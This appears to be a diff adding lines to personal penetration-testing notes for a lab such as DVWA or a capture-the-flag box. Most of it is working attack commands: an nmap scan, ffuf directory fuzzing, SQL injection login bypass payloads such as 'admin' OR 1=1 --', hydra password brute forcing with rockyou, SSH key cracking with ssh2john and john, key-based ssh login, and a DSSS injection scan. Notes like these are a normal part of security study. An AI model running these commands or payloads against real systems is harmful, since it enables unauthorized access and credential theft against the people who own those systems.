@@ -62,6 +62,34 @@ check the lenght , the password have a changed lenght size
  MEDIUM DIFFICULT 
  the same commands but change the cookie value to medium
  hydra -l admin -P /usr/share/wordlists/john.lst 'http-getform://127.0.0.1:42001/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=7vs4mhc1q4dnp3f6cgikl01v9q; security=medium:F=Username and/or password incorrect' 
+
+ Sudo nmap -T5 -sS -sV -O 192.168.1.1
+ down speed with -T3
+ how to find an hidden directory in web server 
+ ffuff -u http://192.168.1.1/FUZZ -w /usr/share/seclists/Discovery/web-Content/directory-list-2.3-medium.txt
+ find the hidden page
+ go to the hidden page http://192.168.1.1/HIDDEN 
+ inspect the html page for some hidden info 
+ try to login with the username and some sql inj like admin' OR 1=1 --
+ use hydra to find the password
+ hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 http-post-form "/hidden/:user=^USER^&pass=^PASS^:F=Username or password invalid
+ in the page found rsa private key link, copy the text in a file
+ nano key.txt and ssh2john key.txt>hash.txt to convert the file in a readable format
+ john hash.txt -w=/usr/share/wordlists/john/john.lst
+ john hash.txt -w=/usr/share/wordlists/rockyou.txt
+ cp key.txt key.pem
+chmod 600 key.pem
+ssh -i key.pem  admin@192.168.1.1 
+
+VULNERABILITY SQL INJECTION
+'OR 1=1 #
+1' OR 1=1
+
+
+DSS SQL INJ 
+cd DSSS
+python3 dsss.py -u "http://www.site.com/viewprofile.aspx?id=1" --cookie="cookieVAlue"
+copy the link and see al the users details
  
 
  
